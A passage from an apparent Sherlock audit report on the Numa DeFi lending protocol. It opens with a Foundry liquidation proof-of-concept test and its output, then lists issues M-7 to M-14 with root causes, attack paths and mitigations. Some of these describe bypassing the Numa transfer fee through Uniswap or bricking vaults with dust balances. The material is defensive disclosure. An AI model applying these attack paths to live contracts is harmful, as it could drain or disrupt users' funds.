        vault.liquidateLstBorrower(userA, remainingBorrow, false, false);  // @audit-issue : no way to liquidate !
        vm.stopPrank();
    }

    function test_liquidationMechanics_path02() public {
        // Initial setup
        vm.prank(deployer);
        vaultManager.setSellFee(1 ether); // no sell fee

        uint collateralAmount = 100 ether;
        uint borrowAmount = 80 ether;  // 80% LTV to start

        deal({token: address(rEth), to: userA, give: collateralAmount});
        
        // First approve and enter the NUMA market
        vm.startPrank(userA);
        address[] memory t = new address[](1);
        t[0] = address(cNuma);
        comptroller.enterMarkets(t);

        // Buy NUMA with rETH to use as collateral
        rEth.approve(address(vault), collateralAmount);
        uint numas = vault.buy(collateralAmount, 0, userA);

        // Deposit NUMA as collateral
        uint cNumaBefore = cNuma.balanceOf(userA);
        numa.approve(address(cNuma), numas);
        cNuma.mint(numas);
        uint cNumas = cNuma.balanceOf(userA) - cNumaBefore;
        
        emit log_named_decimal_uint("Numas deposited =", numas, 18);
        emit log_named_decimal_uint("cNumas received =", cNumas, 18);

        // Borrow rETH
        cReth.borrow(borrowAmount);
        uint initialBorrowBalance = cReth.borrowBalanceCurrent(userA);
        emit log_named_decimal_uint("Initial borrow =", initialBorrowBalance, 18);
        (, , uint shortfall, uint badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        assertEq(shortfall, 0, "Unhealthy borrow");
        vm.stopPrank();

        // Make position liquidatable by manipulating the sell fee
        vm.startPrank(deployer);
        vaultManager.setSellFee(0.87 ether); // price drop making position liquidatable
        
        // Verify position is liquidatable
        (, , shortfall, badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        assertGt(shortfall, 0, "Position should be liquidatable");
        assertEq(badDebt, 0, "Position shouldn't be in badDebt region");
        emit log_named_decimal_uint("Shortfall =", shortfall, 18);

        // Set liquidation incentive 
        comptroller._setLiquidationIncentive(1.12e18); // 12% premium
        // Set close factor 
        comptroller._setCloseFactor(0.85e18); // 85%
        vm.stopPrank();

        // First liquidation attempt
        vm.startPrank(userC); // liquidator
        uint borrowBalance = cReth.borrowBalanceCurrent(userA);
        uint repayAmount = (borrowBalance * 85) / 100; // 85% of the debt
        
        deal({token: address(rEth), to: userC, give: repayAmount});
        rEth.approve(address(vault), repayAmount);
        
        // This should succeed since there's enough collateral for the first liquidation
        vault.liquidateLstBorrower(userA, repayAmount, false, false);
        emit log_named_decimal_uint("First liquidation repaid =", repayAmount, 18);

        // Second liquidation attempt for remaining debt
        uint remainingBorrow = cReth.borrowBalanceCurrent(userA);
        emit log_named_decimal_uint("Remaining borrow =", remainingBorrow, 18);
        // Verify the position again for badDebt
        (, , shortfall, badDebt) = comptroller.getAccountLiquidityIsolate(userA, cNuma, cReth);
        emit log_named_decimal_uint("Shortfall2 =", shortfall, 18);
        emit log_named_decimal_uint("BadDebt2   =", badDebt, 18);
        assertGt(badDebt, 0, "Position2 should be in badDebt region"); // @audit-issue : has become badDebt now; unprofitable for liquidators
        vm.stopPrank();
    }
```

</details>
<br>

Output:
```text
Ran 2 tests for contracts/Test/Vault.t.sol:VaultTest
[PASS] test_liquidationMechanics_path01() (gas: 2288863)
Logs:
  VAULT TEST
  Numas deposited =: 176595.092400931043253778
  cNumas received =: 0.000882975462004655
  Initial borrow =: 20.000000000000000000
  Shortfall =: 1.817974907058021698
  redeem? 0

  First liquidation repaid =: 11.000000000000000000
  Remaining borrow =: 9.000000000000000000
  Shortfall2 =: 1.289974907057879019
  BadDebt2   =: 0.000000000000000000

[PASS] test_liquidationMechanics_path02() (gas: 1828185)
Logs:
  VAULT TEST
  Numas deposited =: 706380.369603724173015115
  cNumas received =: 0.003531901848018620
  Initial borrow =: 80.000000000000000000
  Shortfall =: 1.264378335974950255
  redeem? 0

  First liquidation repaid =: 68.000000000000000000
  Remaining borrow =: 12.000000000000000000
  Shortfall2 =: 5.573919060292848876
  BadDebt2   =: 5.235704273992472501

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 52.60s (5.50s CPU time)
```

## Mitigation 
Add the following 2 checks:

1. If a partial liquidation attempt would result in the debt going into badDebt territory, then it should not be allowed. Full liquidations should be allowed in such cases with a reduced liquidation incentive applicable. The code should allow `repayAmount = borrowBalance` and bypass the `closeFactorMantissa` constraint ( or set it temporarily to `1e18` ).

2. If a full liquidation attempt ( possible when `borrowBalance < minBorrowAmountAllowPartialLiquidation` ) would result in `seizeTokens` to be greater than the cToken collateral balance of the borrower, then the liquidator should still be allowed to go ahead and be awarded all the available cTokens in borrower's balance. 

This possibility of a reduced liquidation incentive should be properly documented so that liquidators know the risk in advance.

## Discussion

**tibthecat**

I think it works like compound and as intended for the bad debt part which can be profitable only if there is way to swap collateral at profit on some LP.

About that comment in the dashboard: 

\_"Thank you for the detailed analysis.

For part 2, this was discussed in the "Counterproductive Incentives" section [here](https://blog.openzeppelin.com/compound-audit). This is the liquidation design of Compound.

For part 1, if I'm understanding correctly, due to the existance of minBorrowAmountAllowPartialLiquidation, should be valid. Example: Collateral=100, Debt=95, incentive=12\%, minBorrowAmountAllowPartialLiquidation=200. Then liquidators can only try to liquidate the whole position, which would fail due to not enough collateral (95*112\% = 106.4 > 100).

Changing this to medium severity."\_

I disagree because our goal IS that liquidator liquidate the maximum possible. Because of our maxProfitPerliquidation, we don't want liquidators to split their liquidations. We added that parameter (minBorrowAmountAllowPartialLiquidation) in case there would not be enough liquidity on the chain to perform the liquidation.



# Issue M-7: leverageStrategy will revert due users interest rate accrual 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/120 

## Found by 
KupiaSec, jokr

### Summary

In the `CNumaToken.leverageStrategy()` function, after borrowing from the market using the `borrowInternalNoTransfer` function, a check is performed to ensure that the user's borrow amount changes only by `borrowAmount` using a `require` statement. However, this check will fail because the user's principal borrow amount will increase by more than `borrowAmount` due to the interest accrued on the user's borrow position.

### Root Cause

```solidity
uint accountBorrowBefore = accountBorrows[msg.sender].principal;
// Borrow but do not transfer borrowed tokens
borrowInternalNoTransfer(borrowAmount, msg.sender);
// uint accountBorrowAfter = accountBorrows[msg.sender].principal;

require(
    (accountBorrows[msg.sender].principal - accountBorrowBefore) == 
        borrowAmount,
    "borrow ko"
);
```
https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CNumaToken.sol#L196-L204

The require statement above will always fail since the user's previous borrow amount accrues interest, causing the principal borrow amount to increase beyond `borrowAmount`.

Even if the global interest rate index is updated, the user's borrow position will only accrue interest when their borrow position is touched as below.

```solidity
    function borrowBalanceStoredInternal(
        address account
    ) internal view returns (uint) {
        /* Get borrowBalance and borrowIndex */
        BorrowSnapshot storage borrowSnapshot = accountBorrows[account];

        /* If borrowBalance = 0 then borrowIndex is likely also 0.
         * Rather than failing the calculation with a division by 0, we immediately return 0 in this case.
         */
        if (borrowSnapshot.principal == 0) {
            return 0;
        }

        /* Calculate new borrow balance using the interest index:
         *  recentBorrowBalance = borrower.borrowBalance * market.borrowIndex / borrower.borrowIndex
         */
        uint principalTimesIndex = borrowSnapshot.principal * borrowIndex;
        return principalTimesIndex / borrowSnapshot.interestIndex;
    }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path



1. Suppose the user has an existing borrow amount of 100. Hence, `accountBorrows[msg.sender].principal = 100`.
2. The user calls the `leverageStrategy` function to borrow an additional 50 from the market.
3. During the borrowing process, interest will accrue on the existing borrow amount. For example, the principal borrow amount will increase to 150.2 (existing borrow = 100, new borrow = 50, accrued interest = 0.2).
4. The `require` statement `(accountBorrows[msg.sender].principal - accountBorrowBefore) == borrowAmount` will then fail because the principal borrow amount includes the accrued interest, making the difference greater than `borrowAmount`.


### Impact

`leverageStrategy` function will fail almost always.

### PoC

_No response_

### Mitigation

Instead of directly fetching the user's previous borrow amount from the state using `accountBorrows[msg.sender].principal`, use the `borrowBalanceStored()` function. This function accounts for accrued interest and provides the correct previous borrow balance, ensuring that the `require` statement works as intended.


```diff
- uint accountBorrowBefore = accountBorrows[msg.sender].principal;
+ uint accountBorrowBefore = borrowBalanceStored(msg.sender);
```


# Issue M-8: User will Received Less Amount Of Numa 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/161 

## Found by 
Nave765, onthehunt

### Summary

User will lose some Numa due to precision loss whenever user calls `NumaPrinter::burnAssetInputToNuma`.


### Root Cause

`BASE_1000` is being used in collateral factor calculation, criticalScaleForNumaPriceAndSellFee, and criticalDebaseFactor within `VaultManager::getSynthScaling` function.

https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/NumaProtocol/VaultManager.sol#L550-L558

```solidity
function getSynthScaling() public view virtual returns (uint scaleSynthBurn, uint syntheticsCurrentPID, uint criticalScaleForNumaPriceAndSellFee, uint blockTime)
    {
        _;
@>      uint criticalDebaseFactor = (currentCF * BASE_1000) / cf_critical;
        // when reaching CF_CRITICAL, we use that criticalDebaseFactor in numa price so that numa price is clipped by this lower limit
        criticalScaleForNumaPriceAndSellFee = criticalDebaseFactor;

        // we apply this multiplier on the factor for when it's used on synthetics burning price
@>      criticalDebaseFactor = (criticalDebaseFactor * BASE_1000) / criticalDebaseMult;

        if (criticalDebaseFactor < scaleSynthBurn)
            scaleSynthBurn = criticalDebaseFactor;
        _;
    }

```

`scaleSynthBurn` is being used to scale NUMA to be received based on the burned asset when user calls `NumaPrinter::burnAssetInputToNuma`. However due to precision loss, user will get less amount than the actual amount to be received.

Assuming the protocol state :

1. Eth balance of all vault = 2500000e18
2. Synth value in ETH = 2300000e18

| Variable                              | Code | Actual    |
| ------------------------------------- | ---- | --------- |
| Collateral Factor                     | 1086 | 1086,9565 |
| criticalScaleForNumaPriceAndSellFee   | 987  | 988,1422  |
| scaleSynthBurn (criticalDebaseFactor) | 897  | 898, 311  |

User calls `NumaPrinter::burnAssetInputToNuma` which then calculate the Numa received with `NumaPrinter::getNbOfNumaFromAssetWithFee`. However, user will get less `costWithoutFee` amount due to precision loss in scaleSynthBurn.

Assuming user try to deposit 500k worth of NUMA in nuAsset, due to low amount of precision user will get 655 less NUMA amount.

```solidity
    function getNbOfNumaFromAssetWithFee(
        address _nuAsset,
        uint256 _nuAssetAmount
    ) public view returns (uint256, uint256) {
        (uint scaleSynthBurn, , , ) = vaultManager.getSynthScaling();
        // apply scale
@>      costWithoutFee = (costWithoutFee * scaleSynthBurn) / BASE_1000;
        // burn fee
        uint256 amountToBurn = computeFeeAmountIn(
            costWithoutFee,
            burnAssetFeeBps
        );
        //uint256 amountToBurn = (_output * burnAssetFeeBps) / 10000;
        return (costWithoutFee - amountToBurn, amountToBurn);
    }
    }
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

No Attack Required

### Impact

User will get less amount when they try to exchange NuAsset to NUMA.


### PoC

_No response_

### Mitigation

Consider changing the precision to 1e18 or bigger than 1000.


# Issue M-9: Before transferring `CToken`, the `accrueInterest()` function should be called first. 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/168 

## Found by 
KupiaSec

### Summary

Before transferring `CToken`, the `NumaComptroller.transferAllowed()` function is called first to prevent any imbalance between the user's collateral and debt value.

However, since `accrueInterest()` is not called before `transferAllowed()`, the imbalance check is performed incorrectly, using outdated data.

As a result, legitimate transfers may be reverted, and illegitimate transfers could succeed.

### Root Cause

Before transferring `CToken`, the [transferTokens()](https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CToken.sol#L149) function is invoked without first calling `accrueInterest()`.

Within the `transferTokens()` function, `transferAllowed()` is called.

The `NumaComptroller.transferAllowed()` function checks for potential imbalances between the user's collateral and debt value. However, this check is inaccurate, as it relies on outdated data because `accrueInterest()` has not been invoked.

As a result, legitimate transfers may be reverted, and illegitimate transfers could succeed.

The reversal of legitimate transfers is particularly concerning, as it can be time-sensitive, especially in liquidation situations for the receiver. And illegitimate transfers can lead to an imbalance between the sender's collateral and the value of their debt, potentially resulting in the sender facing liquidation after the transfer.

```solidity
    function transfer(
        address dst,
        uint256 amount
    ) external override nonReentrant returns (bool) {
149     return transferTokens(msg.sender, msg.sender, dst, amount) == NO_ERROR;
    }

--------------------

    function transferTokens(
        address spender,
        address src,
        address dst,
        uint tokens
    ) internal returns (uint) {
        /* Fail if transfer not allowed */
90      uint allowed = comptroller.transferAllowed(
            address(this),
            src,
            dst,
            tokens
        );
        if (allowed != 0) {
            revert TransferComptrollerRejection(allowed);
        }

        ...
    }
```

### Internal pre-conditions

### External pre-conditions

### Attack Path

### Impact

Legitimate transfers may be reverted, and illegitimate transfers could succeed.

If the receiver is on the verge of liquidation, the reversal of legitimate transfers to this receiver becomes a time-sensitive issue.

And illegitimate transfers can lead to an imbalance between the sender's collateral and the value of their debt, potentially resulting in the sender facing liquidation after the transfer.

### PoC

### Mitigation

Invoke `accrueInterest()` before the transfer.

## Discussion

**tibthecat**

This is coming from compound V2 fork. Is compound V2 vulnerable to that too?



# Issue M-10: Precision loss in setMaxSpotOffsetBps function leads to Incorrect Numa Prices 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/175 

## Found by 
jokr

### Summary

Due to precision loss in `NumaOracle.setMaxSpotOffsetBps()`, the spot price is modified (increased or decreased) by incorrect percentages, resulting in incorrect prices.


### Root Cause

Due to precision loss during the calculation of `maxSpotOffsetPlus1SqrtBps` and `maxSpotOffsetMinus1SqrtBps`, the spot price from the LP increases or decreases by more than the desired percentage.


```solidity
    function setMaxSpotOffsetBps(uint _maxSpotOffsetBps) external onlyOwner {
        require(_maxSpotOffsetBps < 10000, "percentage must be less than 100");
         // @audit-issue precision loss here
         maxSpotOffsetPlus1SqrtBps =
            100 *
            uint160(Math.sqrt(10000 + _maxSpotOffsetBps));
        // @audit-issue precision loss here
        maxSpotOffsetMinus1SqrtBps =
            100 *
            uint160(Math.sqrt(10000 - _maxSpotOffsetBps));

        emit MaxSpotOffsetBps(_maxSpotOffsetBps);
    }
```
https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/NumaProtocol/NumaOracle.sol#L74-L85


For example, let’s say `_maxSpotOffsetBps = 145` (1.45% as mentioned in the documentation). 
In this case, `maxSpotOffsetPlus1SqrtBps` should ideally be `10072`. However, since `Math.sqrt(10000 + 145) = 100.72`, it will be rounded down to `100` in Solidity. As a result, `maxSpotOffsetPlus1SqrtBps` will be set to `10000` instead of `10072`. This means that, instead of increasing the spot price by 1.45%, the spot price will remain unchanged.

Similarly, for `maxSpotOffsetMinus1SqrtBps`, it will be set to `9900` instead of `9927`. This results in the spot price decreasing by 1.99% instead of the intended 1.45%.


### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Incorrect prices result in conversions between Numa and nuAssets occurring at inaccurate rates.

### PoC


```solidity
Initial values:
sqrtPriceX96: 51371404683662199233634777298 (From Numa/DAI pool)
Converted to price: 0.42042033575707566
sqrtPriceX96_2: 1364847094945173773261425958388466 (From USDC/ETH pool)
Converted to price: 3369.6994581667514

Testing with 145 bps (1.45%):
maxSpotOffsetPlus1SqrtBps: 10000
maxSpotOffsetMinus1SqrtBps: 9900

run() results (direct prices):
Original price: 0.42042033575707566
Decreased price: 0.4120539710755098
Increased price: 0.42042033575707566
Percentage change (decrease): -1.99%
Percentage change (increase): 0.00%

run2() results (inverse prices):
Original price: 3369.6994581667514 (ETH price in USDC)
Decreased price: 3302.642438949233
Increased price: 3369.6994581667514
Percentage change (decrease): -1.99%
Percentage change (increase): 0.00%
```

### Mitigation

Increase the precision of `_maxSpotOffsetBps` to avoid precision losses.

# Issue M-11: No slippage check for leverageStrategy function 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/182 

## Found by 
jokr

### Summary

When a user opens a leveraged position using the CNumaToken.leverageStrategy() function, there is no slippage protection to limit the price at which tokens are bought by the strategy contract. As a result, if the tokens are purchased at an unfavorable price, the user may incur more debt than expected. Additionally, the function lacks a deadline parameter to ensure that the transaction is executed within a specified timeframe. Without this parameter, if the transaction is delayed, the user has no control over the price at which the tokens are purchased, increasing their risk.

### Root Cause

In [CNumaToken.sol:193](https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/lending/CNumaToken.sol#L193), there is no slippage check for the `borrowAmount`. As a result, if the tokens are purchased at a worse price than expected, the user may incur more debt than intended.

```solidity
    function leverageStrategy(
        uint _suppliedAmount, // 1O Numa 
        uint _borrowAmount, // 40 Numa -> rETH
        CNumaToken _collateral,
        uint _strategyIndex
    ) external {
    
       // ...
       
        // how much to we need to borrow to repay vault
        // @audit-issue There should slippage protection here. Otherwise user will incur more debt if tokens are swap at worst price
        uint borrowAmount = strat.getAmountIn(_borrowAmount, false);
      

        uint accountBorrowBefore = accountBorrows[msg.sender].principal;
       
        borrowInternalNoTransfer(borrowAmount, msg.sender);
   
        
        require(
            (accountBorrows[msg.sender].principal - accountBorrowBefore) ==
                borrowAmount,
            "borrow ko"
        );
        
                // swap
        EIP20Interface(underlying).approve(address(strat), borrowAmount);
        (uint collateralReceived, uint unUsedInput) = strat.swap(
            borrowAmount,
            _borrowAmount,
            false
        );


    }
   ```

The `closeLeverageStrategy` function also lacks slippage protection. 

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

Let's assume 1 Numa = 0.1 rETH.

1. The user calls `leverageStrategy(10, 40, cNuma)` to open a 5x leveraged position in Numa tokens.
2. 10 Numa will be supplied by the user, and 40 Numa will be flash-borrowed from the Numa Vault by the cReth contract.
3. These 50 Numa will be supplied as collateral to the cNuma market.
4. The cReth contract will then borrow rETH against the provided collateral (50 Numa in step 3) and exchange it for Numa to repay the 40 Numa flash loan taken in step 2.
5. The user expects to incur 4 rETH of debt (40 Numa * 0.1 rETH per Numa). However, there is no control over the price at which the swap occurs. If the swap happens at a worse price, for example, 1 Numa = 0.15 rETH, the user will incur 6 rETH of debt instead of the expected 4 rETH. This price discrepancy results in a loss for the user.



### Impact

User will incur more debt that expected due to lack of slippage check.

### PoC

_No response_

### Mitigation

Add slippage protection for `borrowAmount` in `leverageStrategy` function.


```diff
    function leverageStrategy(
        uint _suppliedAmount, // 1O Numa 
        uint _borrowAmount, // 40 Numa -> rETH
        CNumaToken _collateral,
        uint _strategyIndex
    ) external {
    
       // ...
       
        // how much to we need to borrow to repay vault
        // @audit-issue There should slippage protection here. Otherwise user will incur more debt if tokens are swap at worst price
        uint borrowAmount = strat.getAmountIn(_borrowAmount, false);
+       require(borrowAmount <= maxBorrowAmount);
      

        uint accountBorrowBefore = accountBorrows[msg.sender].principal;
       
        borrowInternalNoTransfer(borrowAmount, msg.sender);
   
        
        require(
            (accountBorrows[msg.sender].principal - accountBorrowBefore) ==
                borrowAmount,
            "borrow ko"
        );
        
                // swap
        EIP20Interface(underlying).approve(address(strat), borrowAmount);
        (uint collateralReceived, uint unUsedInput) = strat.swap(
            borrowAmount,
            _borrowAmount,
            false
        );


    }
   ```
Also add slippage protection for `closeLeverageStrategy` function.

# Issue M-12: Numa tokens fee on transfer can be bypassed 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/184 

The protocol has acknowledged this issue.

## Found by 
jokr

### Summary

The Numa token is designed in a way that if users want to transfer Numa tokens to a specific address present in `isIncludedInFees`, a fee will be applied. Additionally, if the `spender` address is in the `wlSpenders` list, no fee is charged

In the case of Uniswap, this design allows fees to be taken when users want to sell Numa tokens in Uniswap. The `wlSpenders` list includes the `UniswapV2Router` to ensure that liquidity providers do not have to pay fees when adding liquidity using the router

  ```solidity
  // cancel fee for some spenders. Typically, this will be used for UniswapV2Router which is used when adding liquidity
  if ((!ns.wlSpenders[spender]) && (fee > 0) && ns.isIncludedInFees[to]) {
      _transferWithFee(from, to, value, fee);
  } else {
      super._transfer(from, to, value);
  }
  ```
  
However, the `UniswapV2Router` also includes functions such as `swapExactTokensForTokens`, which can be used to swap Numa tokens. Since the router is in the whitelist, no fees will be applied for the swap. This allows users to bypass the fee when selling their Numa tokens on Uniswap

### Root Cause

In [Numa.sol:95](https://github.com/sherlock-audit/2024-12-numa-audit/blob/main/Numa/contracts/Numa.sol#L95),  if the spender is whitelisted, no fee will be charged. The whitelisted spender, UniswapV2Router, can also be used to sell Numa tokens, thereby bypassing the fee.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

_No response_

### Impact

Users can sell Numa tokens on Uniswap without paying any fees

### PoC

_No response_

### Mitigation

Change fee on transfer implementation of Numa token

## Discussion

**tibthecat**

Irrelevant as current deployed Numa token does not have "on-transfer fee" anymore. And numa.sol should not have been in the audit scope.

**c-plus-plus-equals-c-plus-one**

> Irrelevant as current deployed Numa token does not have "on-transfer fee" anymore. And numa.sol should not have been in the audit scope.

![image](https://github.com/user-attachments/assets/44e294a9-01b5-4dc7-b037-80ad20e5d504)




# Issue M-13: Buy fee PID is updated with wrong amounts leading to unexpected fee growth 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/199 

## Found by 
Afriaudit, OpaBatyo, zarkk01

### Summary

## Summary
`updateBuyFeePID` is invoked with Numa amount before fee, instead of the actual numa that was minted
## Description
Let's take a look at the Numa `buy` flow.
```solidity
        uint256 numaAmount = vaultManager.tokenToNuma( // calculates how much numa we get for input amount reth
            _inputAmount,
            last_lsttokenvalueWei,
            decimals,
            _criticalScaleForNumaPriceAndSellFee
        );

        require(numaAmount > 0, "amount of numa is <= 0");
        if (_transferREth) {                          // transfers the reth
            SafeERC20.safeTransferFrom(
                lstToken,
                msg.sender,
                address(this),
                _inputAmount
            );
        }
        uint fee = vaultManager.getBuyFee();
        if (feeWhitelisted[msg.sender]) {
            fee = 1 ether; // max percent (= no fee)
        }
        _numaOut = (numaAmount * fee) / 1 ether;       // applies buy fee
        require(_numaOut >= _minNumaAmount, "Min NUMA");
        minterContract.mint(_receiver, _numaOut);      // mint amount after fee
```
Buyers send their desired rETH which is exchanged for Numa and a buy fee is subtrtacted directly from the Numa they are owed. However at the end of the function, `updateBuyFeePID` is called in order to update the future buy fee of numa since supply increased.

```solidity
        vaultManager.updateBuyFeePID(numaAmount, true); // @audit-issue called with amount pre-tax
```

However the update function is invoked with `numaAmount` which is the number before the buy fee is applied. This is incorrect since the actual minted amount is smaller than what the `updateBuyFeePID` is called with. For instance, we send rETH to get 100 NUMA tokens, fee = 10%, we will get minted 90 NUMA tokens, however the vault manager will be updated as if 100 NUMA tokens were minted. 

Let's have an example with a fee whitelisted user - they will pay no fees so `_numaOut = numaAmount`. If a whitelisted user deposits rETH to get 100 NUMA tokens, they will get minted 100 NUMA tokens and will invoke `updateBuyFeePID` with the 100 minted NUMA. Both users influenced the buy fee PID by 100 NUMA, however they got minted different amounts.

Further proof validating this issue can be seen in `sell` where `updateBuyFeePID` is invoked with the actual amount of Numa that was burnt, meaning that the amounts that are minted/burnt should be used in updating fee PID.
```solidity
        numa.burn(_numaAmount);
        
        vaultManager.updateBuyFeePID(_numaAmount, false);
    
```

### Root Cause

- In [`NumaVault.buyNoMax`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/NumaProtocol/NumaVault.sol#L527), `updateBuyFeePID` is invoked with wrong, inflated amount instead of the actual numa that was minted

### Internal pre-conditions

none

### External pre-conditions

none

### Attack Path

none, wrong logic

### Impact

- wrong fee calculation
- loss for users

### PoC

_No response_

### Mitigation

Invoke `updateBuyFeePID` with the actual minted amount in `NumaVault.buyNoMax`

## Discussion

**tibthecat**

I don't think it makes a big difference. But I will check with team.



# Issue M-14: Vaults can be purposefully bricked by leaving small amounts of rETH 

Source: https://github.com/sherlock-audit/2024-12-numa-audit-judging/issues/220 

The protocol has acknowledged this issue.

## Found by 
OpaBatyo

### Summary

## Summary
Any numa holder can sell their numa in any vault, regardless where the tokens came from, allowing Numa holders to have preferential vaults and brick smaller ones by leaving dust amounts of rETH.
## Description
Vaults have strict MIN and MAX deposit amounts which can be abused by leaving small amounts in it. One possible attack is a whale Numa holder to sell tokens in a smaller vault in order to cause the MAX deposit amount (10% of current lst balance) to be smaller than the MIN (1000 wei).
```solidity
        uint256 vaultsBalance = getVaultBalance();
        uint256 MAX = (max_percent * vaultsBalance) / BASE_1000; // @audit this can be below the constant MIN
        require(_inputAmount <= MAX, "must trade under max");
```
If a vault is left with balance of 9999 wei, MAX will always be smaller than MIN, causing a soft DoS. This attack is relevant even without bricking deposits entirely since a vault can be left with negligible amounts of liquidity and users will be allowed to MAX deposit only a fraction of that. For example:  

Vault holds 1 rETH (1e18 wei) currently valued at 3700 USD.  
Numa holder comes with their liquidity from another vault and burns it, leaving 0.0001 rETH (1e14 wei) or around 0.37 USD
Any further deposits to this vault can be at most a fraction of 0.37 USD, even if `max_percent = 1000`

Users won't be able to deposit a significant amount in this vault, effectively being pushed away from it or forced to interact with a bigger one. Large liquidity providers can collude and perform such attacks to increase their rewards and interest accrued in a preferential vault.

### Root Cause

- [`NumaVault.buy`](https://github.com/sherlock-audit/2024-12-numa-audit/blob/ae1d7781efb4cb2c3a40c642887ddadeecabb97d/Numa/contracts/NumaProtocol/NumaVault.sol#L441) allows to only deposit, at most, a fraction of the current liquidity
- There are no checks in `NumaVault.sell` whether or not the burnt Numa was minted in the same vault

### Internal pre-conditions

None

### External pre-conditions

none

### Attack Path

1. Whale user mints large amounts of Numa in a big vault
2. User sells it in smaller vaults, leaving their liquidity at negligible values
3. Other protocol users can't make a significant deposit in the other vault so they opt for the bigger one
4. Whale user benefits from the extra liquidity/fees/rewards in the big vault

### Impact

- unexpected behaviour
- protocol can be gamed

### PoC

_No response_

### Mitigation

Track numa balances internally and allow users to sell tokens only from the vault that initially minted them. Additionally, add a boolean `max_percent_toggle` in the vault and perform a MAX deposit check only when it's on. This way in the scenario where the vault is left with 0.37 USD worth of rETH, admins can turn the `max_percent` check off in order to have the vault's liquidity restored before turning it on again.

